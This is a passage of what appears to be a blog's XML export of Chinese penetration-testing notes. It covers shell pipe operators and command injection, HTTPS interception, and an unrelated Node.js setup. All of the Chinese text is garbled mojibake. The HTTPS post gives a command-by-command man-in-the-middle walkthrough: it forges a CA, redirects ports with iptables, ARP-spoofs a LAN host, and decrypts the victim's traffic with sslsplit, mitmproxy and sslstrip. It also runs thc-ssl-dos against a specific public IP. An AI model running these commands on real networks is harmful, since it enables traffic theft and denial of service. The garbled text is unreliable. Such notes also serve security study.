    <content type="text"><![CDATA[å¸¸è§çš„ç®¡é“ç¬¦ï¼šWindowsï¼š| ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥|| å¦‚æœå‰é¢å‡ºé”™ï¼ˆå³ä¸ºfalseï¼‰ï¼Œå°±æ‰§è¡Œåé¢çš„è¯­å¥ï¼ˆå‰é¢åªèƒ½ä¸ºå‡ï¼‰&amp; å¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ï¼ˆå‰é¢å¯çœŸå¯å‡ï¼‰&amp;&amp; å¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡ï¼Œåˆ™ç›´æ¥å‡ºé”™ï¼Œä¸”ä¸æ‰§è¡Œåé¢çš„è¯­å¥ï¼ˆå‰é¢åªèƒ½ä¸ºçœŸï¼‰ Linuxï¼š; æ‰§è¡Œå®Œå‰é¢å†æ‰§è¡Œåé¢| æ˜¾ç¤ºåé¢è¯­å¥çš„æ‰§è¡Œç»“æœ|| å‰é¢è¯­å¥å‡ºé”™æ—¶ï¼Œæ‰§è¡Œåé¢çš„è¯­å¥&amp; å¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ï¼ˆå‰é¢å¯çœŸå¯å‡ï¼‰&amp;&amp; å¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡ï¼Œåˆ™ç›´æ¥å‡ºé”™ï¼Œä¸”ä¸æ‰§è¡Œåé¢çš„è¯­å¥ï¼ˆå‰é¢åªèƒ½ä¸ºçœŸï¼‰ å‘½ä»¤æ‰§è¡Œç®€ä»‹ç¨‹åºå¦‚æœæä¾›æ‰§è¡Œ å‘½ä»¤çš„åŠŸèƒ½æ¯”å¦‚æä¾›äº†pingçš„åŠŸèƒ½ï¼š è¾“å…¥ ping | dir, åˆ©ç”¨äº†ç®¡é“ç¬¦æ‰§è¡Œäº†dir phpä¸­å¸¸è§çš„æ‰§è¡Œç³»ç»Ÿ å‘½ä»¤çš„å‡½æ•°ï¼š system, exec, shell_exec, passthru, popen, proc_popen ä¿®å¤å»ºè®® å°½é‡ä¸è¦ä½¿ç”¨ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œå‡½æ•° å¯¹å®¢æˆ·ç«¯æäº¤çš„å˜é‡è¿›è¡Œè¿‡æ»¤å’Œæ£€æµ‹ ä½¿ç”¨åŠ¨æ€å‡½æ•°ä¹‹å‰ï¼Œç¡®ä¿ä½¿ç”¨çš„å‡½æ•°æ˜¯ç½®é¡¶çš„å‡½æ•°ä¹‹ä¸€ å¯¹phpæ¥è¯´ï¼Œä¸èƒ½å®Œå…¨æ§åˆ¶çš„å±é™©å‡½æ•°æœ€å¥½ä¸è¦ä½¿ç”¨ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>å¸¸è§çš„ç®¡é“ç¬¦</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTPSæ”»å‡»]]></title>
    <url>%2Fposts%2F33956%2F</url>
    <content type="text"><![CDATA[HTTPSæ”»å‡»é˜²æ­¢æ¶æ„æ³¨å…¥ã€DNSåŠ«æŒ httpsçš„ä½œç”¨ C I A è§£å†³çš„æ˜¯ä¿¡æ¯ä¼ è¾“è¿‡ç¨‹ä¸­æ•°æ®è¢«ç¯¡æ”¹ã€çªƒå– åŠ å¯†ï¼šå¯¹ç§°ã€éå¯¹ç§°ã€å•å‘(Hash) httpsæ”»å‡»æ–¹æ³• é™çº§æ”»å‡» è§£å¯†æ”»å‡»ï¼ˆæ˜æ–‡ã€è¯ä¹¦ä¼ªé€ ï¼‰â€“ åŠ«æŒ åè®®æ¼æ´ã€å®ç°æ–¹æ³•çš„æ¼æ´ã€é…ç½®ä¸ä¸¥æ ¼ å¸¸è¯†SSLï¼ˆå®‰å…¨å¥—æ¥å±‚, Secure socket layerï¼‰,åæ¥ä½¿ç”¨TSLå–ä»£äº†SSLï¼Œåªä¸è¿‡ä¹ æƒ¯äº†å«SSL SSL/TLSä¹Ÿè¢«ç”¨äºå…¶ä»–åœºæ™¯çš„ä¼ è¾“é€šé“åŠ å¯†ï¼š é‚®ä»¶ä¼ è¾“ï¼ˆæœåŠ¡å™¨é—´ã€å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨é—´ï¼‰ æ•°æ®åº“æœåŠ¡å™¨é—´ LDAPèº«ä»½è®¤è¯æœåŠ¡å™¨é—´ SSL VPN è¿œç¨‹æ¡Œé¢RDPé€šä¿¡è¿‡ç¨‹ä¸­çš„åŠ å¯†å’Œèº«ä»½è®¤è¯ Webé€šä¿¡ä¸­SSLåŠ å¯† å…¬é’¥è¯ä¹¦ï¼ˆå—ä¿¡ä»»çš„ç¬¬ä¸‰æ–¹è¯ä¹¦é¢å‘æœºæ„ç­¾åé¢å‘ï¼‰ å¸¸è§çš„è¯ä¹¦é¢å‘æœºæ„ï¼šVeriSignã€Thawteã€GlobalSignã€Symantec åŠ å¯†è¿‡ç¨‹ï¼šæ¡æ‰‹ã€åå•†åŠ å¯†ç®—æ³•ã€è·å–å…¬é’¥è¯ä¹¦ã€äº¤æ¢ä¼šè¯ç§˜é’¥ã€åŠ å¯†ä¿¡æ¯ä¼ è¾“ éå¯¹ç§°åŠ å¯†ç®—æ³• éå¯¹ç§°åŠ å¯†ä¸€èˆ¬ç”¨æ¥åŠ å¯†æ¯”è¾ƒå°çš„æ•°æ®ä¾‹å¦‚ï¼šRSA, ECCç­‰ å¯¹ç§°åŠ å¯†ç®—æ³• DES/3DES, AES, IDEA, RC4 â€¦â€¦ å•å‘åŠ å¯†ç®—æ³•(Hash) Hashç®—æ³• Hashå€¼é•¿åº¦(bit) MD5 128 SHA-1 160 SHA-2 224,256,384,512 SSLçš„å¼±ç‚¹ SSLæ˜¯ä¸åŒçš„å¯¹ç§°ã€éå¯¹ç§°ã€å•é¡¹åŠ å¯†ç®—æ³•çš„ç»„åˆåŠ å¯†å®ç°(cipher suite) æœåŠ¡å™¨ç«¯ä¸ºæä¾›æ›´å¥½çš„å…¼å®¹æ€§ï¼Œé€‰æ‹©æ”¯æŒå¤§é‡è¿‡æ—¶cipher suite åå•†è¿‡ç¨‹ä¸­å¢™çš®é™çº§åŠ å¯†å¼ºåº¦ ç°ä»£å¤„ç†å™¨è®¡ç®—èƒ½åŠ›å¯ä»¥åœ¨å¯æ¥å—çš„æ—¶é—´å†…ç ´è§£è¿‡æ—¶åŠ å¯†ç®—æ³• è´­ä¹°äº‘è®¡ç®—èµ„æºç ´è§£ å®è·µ æŸ¥çœ‹webç«™ç‚¹ç”¨äº†å•¥æ ·çš„sslåè®®ï¼Œä»€ä¹ˆç‰ˆæœ¬ï¼Œä»€ä¹ˆç»„åˆ 1.opensslå‘½ä»¤openssl s_client --connect www.baidu.com:443 #è¯ä¹¦é¢å‘æœºæ„ä¹Ÿæ˜¯æ ‘å½¢ç»“æ„çš„ï¼Œæœ‰ä¸€çº§äºŒçº§ #æŒ‡å®šæŸ¥çœ‹æ˜¯å¦æ”¯æŒæŸåè®®å’Œç»„åˆ openssl s_client -tls1_2 -cipher 'ECDHE-ECDSA-AES128-GCM-SHA256' -connect www.taobao.com:443 # æµ‹è¯•æ˜¯å¦å¯ä»¥è·Ÿå·²çŸ¥çš„ä¸å®‰å…¨çš„cipher suiteå»ºç«‹è¿æ¥ openssl s_client -tls1_2 -cipher 'NULL,EXPORT,LOW,DES' -connect www.taobao.com:443 # å·²çŸ¥çš„ä¸å®‰å…¨çš„ç»„åˆcipher suite openssl ciphers -v 'NULL,EXPORT,LOW,DES' # å‚è€ƒç½‘ç«™ï¼ˆåŠ å¯†æŠ€æœ¯ï¼‰ https://www.openssl.org/docs/apps/ciphers.html Openssléœ€è¦å¤§é‡å¯†ç å­¦ç›¸å…³çŸ¥è¯†ï¼Œå‘½ä»¤å¤æ‚ï¼Œç»“æœå¯è¯»æ€§å·® 2.SSLScanå·¥å…· è‡ªåŠ¨è¯†åˆ«sslé…ç½®é”™è¯¯ã€è¿‡æœŸåè®®ã€è¿‡æ—¶cipher suiteå’Œhashç®—æ³• é»˜è®¤ä¼šæ£€æŸ¥CRIMEã€å¿ƒè„å‡ºè¡€æ¼æ´ ç»¿è‰²è¡¨ç¤ºå®‰å…¨ï¼Œçº¢è‰²é»„è‰²éœ€è¦å¼•èµ·æ³¨æ„ æŸ¥çœ‹TLSæ”¯æŒçš„cipher suite # æ£€æŸ¥æ‰€æœ‰çš„æ”¯æŒçš„tlsæ˜¯å¦æœ‰ä¸å®‰å…¨çš„ sslscan --tlsall www.taobao.com:443 # Altnamesé€‰é¡¹ä¸‹é¢çš„åŸŸåä¹Ÿå¯ä»¥ä½¿ç”¨ä¸Šé¢åŸŸåçš„è¯ä¹¦ åˆ†æè¯ä¹¦è¯¦ç»†ä¿¡æ¯ sslscan --show-certificate -no-ciphersuites www.taobao.com:443 3.SSLyzeå·¥å…· Pythonç¼–å†™ æ£€æŸ¥sslè¿‡æ—¶ç‰ˆæœ¬ æ£€æŸ¥å­˜åœ¨å¼±ç‚¹çš„cipher suite æ‰«æå¤šç«™ç‚¹æ—¶ï¼Œæ”¯æŒæ¥æºæ–‡ä»¶(å¤šä¸ªç«™ç‚¹æ”¾åˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œé¢) æ£€æŸ¥æ˜¯å¦æ”¯æŒä¼šè¯æ¢å¤ sslyze --regular www.supercomputerboytony.cn 4.Nmap# æšä¸¾cipher suite nmap --script=ssl-enum-ciphers.nse www.supercomputerboytony.cn 5. åœ¨çº¿ç½‘ç«™ï¼šè¾“å…¥åŸŸåï¼Œå¯¹SSLè¿›è¡Œæ£€æµ‹https://www.ssllabs.com/ssltest SSLä¸­é—´äººæ”»å‡»æ¦‚è¿°æ”»å‡»è€…ä½äºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨é€šä¿¡é“¾è·¯ä¸­ 1.ARPæ¬ºéª—ï¼ˆæœ€å¸¸ç”¨ï¼‰ 2.DHCPå¦‚æœæœ‰å¦ä¸€å°æœºå™¨ï¼Œæ¯”ä¹‹å‰çš„dhcpæœåŠ¡å™¨ç¦»ç”¨æˆ·æ›´è¿‘ï¼Œé‚£ä¹ˆæ”»å‡»è€…çš„æœºå™¨å°±ä¼šæ›´å¿«å“åº”(DHCPç¬¬ä¸€æ­¥æ˜¯å¹¿æ’­) 3.ä¿®æ”¹ç½‘å…³ 4.ä¿®æ”¹DNS(å¦‚æœæ§åˆ¶äº†å®¢æˆ·æœº, ç›´æ¥ä¿®æ”¹å®¢æˆ·æœºçš„dnsé…ç½®) 5.ä¿®æ”¹HOSTS 6.ICMPã€STP(äºŒå±‚çš„ç”Ÿæˆæ ‘åè®®)ã€OSPF(ä¸‰å±‚çš„å¼€æ”¾å¼æœ€çŸ­è·¯å¾„ä¼˜å…ˆåè®®) â€”&gt;å¦‚æœå¤„åœ¨åŒä¸€å±€åŸŸç½‘ ä¸ä»…æ˜¯httpå’Œtcp/ipåè®®å®¹æ˜“å‡ºç°å®‰å…¨é—®é¢˜ï¼Œåº•å±‚çš„ç½‘ç»œåè®®ä¹Ÿå­˜åœ¨å¾ˆå¤šé—®é¢˜ï¼Œè‡ªå·±æ­å»ºç¯å¢ƒç»ƒä¹  åŠ å¯†æµé‡ psï¼šä¸‹æ¥çš„æ¼”ç¤ºï¼Œæ˜¯åŸºäºARPæ¬ºéª—çš„ï¼š åˆ©ç”¨æ”»å‡»çš„å‰æ å®¢æˆ·ç«¯å·²ç»ä¿¡ä»»äº†ä¼ªé€ è¯ä¹¦é¢å‘æœºæ„ æ”»å‡»è€…æ§åˆ¶äº†æ ¸å‘è¯ä¹¦é¢å‘æœºæ„ï¼ˆCAè¯ä¹¦æœåŠ¡å™¨ï¼‰ å®¢æˆ·ç«¯ç¨‹åºç¦æ­¢äº†æ˜¾ç¤ºè¯ä¹¦é”™è¯¯å‘Šè­¦ä¿¡æ¯ æ”»å‡»è€…å·²ç»æ§åˆ¶å®¢æˆ·ç«¯ï¼Œå¹¶å¼ºåˆ¶å…¶ä¿¡ä»»ä¼ªé€ è¯ä¹¦ å·¥å…·å¯¹å·²ç»å®ç°ä¸­é—´äººæ¬ºéª—(è¿™é‡Œç”¨arpspoof)åï¼Œä¸‹é¢çš„å·¥å…·å¯¹ä¿¡æ¯è¿›è¡Œè§£å¯† 1.SSLsplitå·¥å…· é€æ˜SSL/TLSä¸­é—´äººæ”»å‡»å·¥å…· å¯¹å®¢æˆ·ç«¯ä¼ªè£…æˆæœåŠ¡å™¨ï¼Œå¯¹æœåŠ¡å™¨ä¼ªè£…æˆæ™®é€šå®¢æˆ·ç«¯ ä¼ªè£…æœåŠ¡å™¨éœ€è¦ä¼ªé€ è¯ä¹¦ï¼ˆåˆ©ç”¨opensslæ¥ç”Ÿæˆä¼ªé€ çš„è¯ä¹¦ï¼‰ æ”¯æŒssl/tlsåŠ å¯†çš„smtpã€pop3ã€ftpç­‰é€šä¿¡ä¸­é—´äººæ”»å‡» 1). openssl # 1.åˆ©ç”¨opensslç”Ÿæˆè¯ä¹¦ç§é’¥ openssl genrsa -out ca.key 2048 # 2.åˆ©ç”¨ç§é’¥ç­¾åç”Ÿæˆè¯ä¹¦(ç”Ÿæ•ˆæ—¶é—´,ä½¿ç”¨çš„ç§é’¥æ–‡ä»¶) -- è¿™æ˜¯æ ¹è¯ä¹¦ï¼Œä¸æ˜¯ä¸€ä¼šä½¿ç”¨çš„è¯ä¹¦ï¼Œç”¨çš„è¯ä¹¦æ˜¯éœ€è¦è¿™ä¸ªæ ¹è¯ä¹¦æ¥ç­¾åçš„ openssl req -new -x509 -days 1096 -key ca.key -out ca.crt # ä¸‹æ¥è¾“å…¥ä¸€äº›ä¿¡æ¯å³å¯ï¼ˆä¿¡æ¯å¯ä»¥æŠŠä¹‹å‰æ‰«æçš„ä¿¡æ¯æ·»è¿›æ¥ä»¥ä¿è¯çœ‹èµ·æ¥å¾ˆçœŸå®ï¼‰ 2).æ”»å‡»æœºå™¨è®¾ç½®è·¯ç”±è½¬å‘ä¸‹é¢ï¼Œå½“å—å®³è€…çš„æµé‡é€šè¿‡æˆ‘çš„æœºå™¨ï¼Œæˆ‘çš„æœºå™¨æ¥è½¬å‘ï¼ˆéœ€è¦æˆ‘çš„ç³»ç»Ÿæ¥å¼€å¯è·¯ç”±åŠŸèƒ½ï¼‰ï¼š åšä¸ªåœ°å€è½¬æ¢, æ¯”å¦‚: æŠŠæˆ‘è®¡ç®—æœº443ç«¯å£æ”¶åˆ°çš„æ•°æ®åŒ…è½¬å‘åˆ°8443ç«¯å£ # å…ˆæŸ¥çœ‹è¦ç”¨åˆ°çš„ç«¯å£æœ‰æ²¡æœ‰è¢«å ç”¨ netstst -pantu |grep :80 # æŸ¥çœ‹natè¡¨ iptables -t nat -L # -F æ¸…ç©º iptables -t nat -F # ç«¯å£è½¬å‘å‘½ä»¤ï¼ˆPREROUTINGåœ¨è·¯ç”±ä¹‹å‰,-påè®®, -jæ“ä½œï¼‰ iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIFECT --to-port 8080 iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIFECT --to-port 8443 iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIFECT --to-port 8443 # MSA iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIFECT --to-port 8443 # SMTPS å‘é‚®ä»¶ iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIFECT --to-port 8443 # IMAPS æ”¶é‚®ä»¶ iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIFECT --to-port 8443 #POP3S #å…¶ä»–ä½¿ç”¨sslåè®®åŠ å¯†çš„åè®®ç«¯å£ä¸€æ · iptables -L 3).ARPæ¬ºéª— # -iæœ¬åœ°ç½‘å¡ -tè¦æ¬ºéª—çš„ç›®æ ‡ï¼Œ -r:è®©ä»–è®¤ä¸ºç½‘å…³192.168.1.1çš„macåœ°å€æ˜¯æˆ‘æœ¬æœºçš„macåœ°å€ arpspoof -i eth0 -t 192.168.1.118 -r 192.168.1.1 #å¯ä»¥å‘ç°ï¼šå—å®³è€…æœºå™¨ä¸Šå…³äºç½‘å…³çš„macå·²ç»æ¢æˆäº†kaliçš„ 4).å¯åŠ¨SSLsplit mkdir -p test/logdir # -D:debugæ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ï¼Œ-læŠŠè¿æ¥ä¿¡æ¯è®°å½•åˆ°å“ªï¼Œ-jâ€œè¶Šç‹±â€çš„æ ¹ç›®å½•(sslsplitçš„)ï¼Œ-Sè¯·æ±‚å…·ä½“æ•°æ®å†…å®¹ä¿å­˜çš„ç›®å½•ï¼Œ-kç§é’¥ï¼Œ-cè¯ä¹¦ï¼›å¯¹sslåŠ å¯†çš„åœ¨æœ¬åœ°8443ç›‘å¬,å¯¹æ˜æ–‡åœ¨æœ¬åœ°8080ç›‘å¬ sslsplit -D -l connect.log -j /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 # æ‰€æœ‰æ“ä½œå®Œæˆäº† ç„¶åè®©è¢«å®³è€…è®¿é—®httpsçš„ä¸€äº›ç½‘ç«™(ä¼šæ˜¾ç¤ºè¯ä¹¦æœ‰é—®é¢˜,æ˜¯å¦ç»§ç»­æµè§ˆ) æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹æ—¥å¿—å’Œæµè§ˆå™¨è¯ä¹¦ä»¥åŠè¯ä¹¦ä¿å­˜ä¿¡æ¯(cat connect.log) , å…·ä½“é€šä¿¡æ•°æ®åœ¨:ls test/logdir, æ¯ä¸ªlogæ–‡ä»¶ä¸­å†…å®¹ä¼šæœ‰è¢«è§£å¯†çš„æ˜æ–‡ä¿¡æ¯ï¼ˆå¦‚æœè¿˜æœ‰åŠ å¯†ä¿¡æ¯,é‚£å°±æ˜¯åº”ç”¨ç¨‹åºæœ¬èº«è¿›è¡Œäº†åŠ å¯†çš„ï¼Œè¿™é‡Œçš„è§£å¯†çš„åªæ˜¯é€šä¿¡è¿‡ç¨‹ä¸­é’ˆå¯¹ssléƒ¨åˆ†ï¼‰é€šè¿‡å…³é”®è¯æŸ¥æ‰¾å†…å®¹ï¼šgrep xxx *.logè¿™æ · åœ¨å—å®³è€…æœºå™¨ä¸Šå®‰è£…æˆ‘ä»¬ç”Ÿæˆçš„æœåŠ¡å™¨æ ¹è¯ä¹¦ä¹‹åå†æ¬¡è®¿é—®(æµè§ˆå™¨å°±ä¸ä¼šå¼¹å‡ºè­¦å‘Šäº†) å…¨ç«™https/éå…¨ç«™httpsï¼ˆæ¯”å¦‚åªæ˜¯ç™»å½•ç­‰éƒ¨åˆ†é¡µé¢åŠ äº†httpsï¼‰ 2.Mitmproxyå·¥å…· è®¾ç½®è·¯ç”±è¡¨è½¬å‘è§„åˆ™ # bug: åªèƒ½åœ¨8080ç«¯å£ç›‘å¬ï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹è§„åˆ™ iptables -t nat -F iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIFECT --to-port 8080 iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIFECT --to-port 8080 ä¹Ÿæ˜¯ä½¿ç”¨arpspoofè¿›è¡Œarpæ¬ºéª— arpspoof -i eth0 -t 192.168.1.118 -r 192.168.1.1 æœ€åï¼ŒMitmproxyä¾¦å¬ mitmproxy -T --host -w mitmproxy.log # mitmproxyä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªè¯ä¹¦ 3.SSLstripå·¥å…·ä¸å‰ä¸¤ç§å·¥å…·ä¸åŒï¼Œæ­¤å·¥å…·å°†å®¢æˆ·ç«¯åˆ°ä¸­é—´äººä¹‹é—´çš„æµé‡å˜ä¸ºæ˜æ–‡(ä¸ç”¨é€šè¿‡å®‰è£…è¯ä¹¦) # è¿™ç§æ›´å®ç”¨ä¾¿æ·ï¼Œä½†æ˜¯...... sslstrip -l 8080 SSL/TLSæ‹’ç»æœåŠ¡æ”»å‡» å’Œæµé‡å¼çš„æ‹’ç»æœåŠ¡æ”»å‡»ä¸åŒ(æ‰“å‡»çš„æ˜¯ç½‘ç»œå¸¦å®½)ï¼Œè€Œæˆ‘ä»¬è¿™é‡Œæ‰“å‡»çš„æ˜¯æœåŠ¡å™¨çš„èµ„æº Note: SSLåå•†åŠ å¯†ï¼ŒæœåŠ¡å™¨èµ„æºåŠ è½½é€Ÿåº¦ä¼šå˜æ…¢ï¼ˆå¤§é‡æ¡æ‰‹è¯·æ±‚ä¼šå¯¼è‡´æ‹’ç»æœåŠ¡ï¼‰ï¼Œä½†æ˜¯ä¼˜åŒ–å¾—å½“å°±å¯ä»¥æ²¡é—®é¢˜ åˆ©ç”¨SSL secure Renegotiationç‰¹æ€§ï¼Œåœ¨å•ä¸€TCPè¿æ¥ä¸­ç”Ÿæˆæ•°åƒä¸ªSSLé‡è¿æ¥è¯·æ±‚ï¼Œé€ æˆæœåŠ¡å™¨èµ„æºè¿‡è½½ ä¸æµé‡å¼çš„æ‹’ç»æœåŠ¡æ”»å‡»ä¸åŒï¼Œthc-ssl-doså¯åˆ©ç”¨dslçº¿è·¯æ‰“å®30Gå¸¦å®½çš„æœåŠ¡å™¨ æœåŠ¡å™¨å¹³å‡å¯ä»¥å¤„ç†300æ¬¡/s SSLæ¡æ‰‹è¯·æ±‚ åˆ©ç”¨thc-ssl-doså·¥å…·#ä½¿ç”¨ thc-ssl-dos 199.223.209.205 2083 -accept digå‘½ä»¤ï¼Œè§£æipåœ°å€ è¡¥å……æ¦‚å¿µAjaxAsynchronous JavaScript and XML æ˜¯ä¸€ç»„ç°æœ‰æŠ€æœ¯çš„ç»„åˆ é€šè¿‡å®¢æˆ·ç«¯è„šæœ¬åŠ¨æ€æ›´æ–°é¡µé¢éƒ¨åˆ†å†…å®¹ï¼Œè€Œéæ•´ä¸ªé¡µé¢ é™ä½å¸¦å®½ä½¿ç”¨ï¼Œæé«˜é€Ÿåº¦ æå‡ç”¨æˆ·ä½“éªŒ åå°å¼‚æ­¥è®¿é—® Ajaxç»„ä»¶ JavaScript(ajaxçš„æ ¸å¿ƒç»„ä»¶) Dynamic HTML(DHTML) DOM ajaxæ¡†æ¶ï¼š jQuery Dojo Tookit Google Web toolkit Microsoft Ajax library åŸºäºAjaxçš„Webåº”ç”¨å·¥ä½œæµç¨‹ ä½¿ç”¨çš„æŠ€æœ¯æ··åˆè¶Šå¤šï¼Œæ”»å‡»é¢å°±è¶Šå¤§(æ¯ä¸ªå‚æ•°éƒ½å¯èƒ½å½¢æˆç‹¬ç«‹çš„æ”»å‡»è¿‡ç¨‹) Ajaxçš„å®‰å…¨é—®é¢˜ å¤šç§æŠ€æœ¯æ··åˆï¼Œæ”»å‡»é¢å°±è¶Šå¤§(æ¯ä¸ªå‚æ•°éƒ½å¯èƒ½å½¢æˆç‹¬ç«‹çš„æ”»å‡»è¿‡ç¨‹) Ajaxå¼•æ“ï¼Œè®¿é—®æ¶æ„ç«™ç‚¹å¯èƒ½åæœä¸¥é‡ï¼Œè™½ç„¶æµè§ˆå™¨æœ‰æ²™ç®±å’ŒSOPï¼Œä½†å¯èƒ½è¢«ç»•è¿‡ æœåŠ¡å™¨ã€å®¢æˆ·ç«¯ä»£ç ç»“åˆä½¿ç”¨äº§ç”Ÿæ··ä¹±ï¼ŒæœåŠ¡å™¨è®¿é—®æ§åˆ¶ä¸å½“ï¼Œå°†ä¿¡æ¯æ³„éœ² æš´éœ²åº”ç”¨ç¨‹åºé€»è¾‘ Ajaxå¯¹æ¸—é€æµ‹è¯•çš„æŒ‘æˆ˜ å¼‚æ­¥è¯·æ±‚æ•°é‡å¤šä¸”éšè”½ è§¦å‘Ajaxè¯·æ±‚çš„æ¡ä»¶æ— è§„å¾‹ æ‰‹åŠ¨å’Œé˜¶æ®µå¤§åŠ›çˆ¬ç½‘å¯èƒ½äº§ç”Ÿå¤§é‡é—æ¼ æ£€æŸ¥æ–¹æ³•ï¼š æ‰‹åŠ¨æŸ¥çœ‹é¡µé¢æºä»£ç æœ‰æ²¡æœ‰ä½¿ç”¨ajaxï¼ˆæ•ˆç‡ä½ä¸€äº›ï¼‰ æµè§ˆå™¨æ‰“å¼€å®¡æŸ¥å…ƒç´ ï¼šnet â€“&gt; XHR / net â€“&gt; javascript ä½¿ç”¨ZAPï¼Œä½¿ç”¨ajaxçˆ¬ç«™åŠŸèƒ½ Web Service é¢å‘æœåŠ¡çš„æ¶æ„ï¼Œä¾¿äºä¸åŒç³»ç»Ÿé›†æˆå…±äº«æ•°æ®å’ŒåŠŸèƒ½ å°¤å…¶é€‚åˆä¸æƒ³æš´éœ²æ•°æ®æ¨¡å‹å’Œç¨‹åºé€»è¾‘è€Œè®¿é—®æ•°æ®çš„åœºæ™¯ æ— é¡µé¢ ä¸¤ç§ç±»å‹ï¼š SOAP ï¼ˆä¼ ç»Ÿï¼Œxmlæ˜¯å”¯ä¸€çš„æ•°æ®äº¤æ¢æ ¼å¼ï¼Œç¹çï¼Œä½†æ˜¯å®‰å…¨ï¼‰ â€“ Simple object access protocol RESTful (jsonæ˜¯é¦–é€‰çš„æ•°æ®äº¤æ¢æ ¼å¼åˆ·) web serviceå®‰å…¨è€ƒè™‘ï¼š ä½¿ç”¨API keyæˆ–session tokenå®ç°å’Œè·Ÿè¸ªèº«ä»½è®¤è¯ èº«ä»½è®¤è¯ç”±æœåŠ¡å™¨å®Œæˆï¼Œè€Œéå®¢æˆ·ç«¯ API key, ç”¨æˆ·å, Session token æ°¸è¿œä¸è¦é€šè¿‡URLå‘é€ RESTful ä¸æä¾›ä»»ä½•å®‰å…¨æœºåˆ¶ï¼Œéœ€è¦ä½¿ç”¨SSL/TLSä¿æŠ¤ä¼ è¾“æ•°æ®å®‰å…¨ SOAPæä¾›å¼ºäºHTTPSçš„WS-securityæœºåˆ¶ ä½¿ç”¨OAuthæˆ–HMACè¿›è¡Œèº«ä»½éªŒè¯ï¼ŒHMACèº«ä»½è®¤è¯ä½¿ç”¨C/Så…±äº«çš„ç§˜é’¥åŠ å¯†API key RESTfulåº”åªå…è®¸èº«ä»½è®¤è¯ç”¨æˆ·ä½¿ç”¨PUTã€DELETEæ–¹æ³• ä½¿ç”¨æ‰€åŠtokené˜²æ­¢CSRFæ”»å‡» å¯¹ç”¨æˆ·æäº¤å‚æ•°è¿‡æ»¤ï¼Œå»ºè®®éƒ¨ç½²åŸºäºä¸¥æ ¼ç™½åå•çš„æ–¹æ³• æŠ¥é”™ä¿¡æ¯æ¶ˆæ¯’ ç›´æ¥å¯¹è±¡å¼•ç”¨åº”ä¸¥æ ¼èº«ä»½éªŒè¯(ç”µå•†å…¬å¸ä»¥IDä½œä¸ºä¸»ç´¢å¼•) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>HTTPSæ”»å‡»</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node.js å…¥é—¨]]></title>
    <url>%2Fposts%2F2238%2F</url>
    <content type="text"><![CDATA[Node.jsæ˜¯ä¸€ä¸ªæœºé‡Chrome V8å¼•æ“çš„JavaScriptè¿è¡Œç¯å¢ƒ Node.jsçš„åŒ…ç®¡ç†å™¨npmï¼Œæ˜¯å…¨çƒæœ€å¤§çš„å¼€æºç”Ÿæ€åº“ç³»ç»Ÿ Node.jså¯è§£æjsä»£ç ï¼Œæ²¡æœ‰æµè§ˆå™¨å®‰å…¨çº§åˆ«çš„é™åˆ¶ ä¸€.å¼€å‘ç¯å¢ƒé…ç½®å®˜ç½‘ï¼š https://nodejs.org/en/ APIæ–‡æ¡£ï¼šhttp://nodejs.cn/api/events.html å¦‚æœéœ€è¦å®‰è£…å¤šä¸ªç‰ˆæœ¬1).docker 2).ä½¿ç”¨nvmæ¥å®‰è£…å¹¶ç»´æŠ¤ï¼ˆæ¨èï¼‰ é¡¹ç›®åœ°å€ï¼šhttps://github.com/nvm-sh/nvm # 1.å®‰è£…nvm curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh | bash # 2.é…ç½®ç¯å¢ƒå˜é‡ #linuxä¸‹ .bash_profileæˆ–.bash_rc export NVM_DIR="$([ -z "${XDG_CONFIG_HOME-}" ] &amp;&amp; printf %s "${HOME}/.nvm" || printf %s "${XDG_CONFIG_HOME}/nvm")" [ -s "$NVM_DIR/nvm.sh" ] &amp;&amp; \. "$NVM_DIR/nvm.sh" # This loads nvm # windowsç³»ç»Ÿã€‚ã€‚ã€‚ 3.é…ç½®åŠ é€Ÿé•œåƒï¼š # åŒæ ·åœ¨ä¸Šé¢çš„é…ç½®æ–‡ä»¶ export NVM_NODEJS_ORG_MIRROR=http://npm.taobao.org/mirrors/node å®‰è£…node# 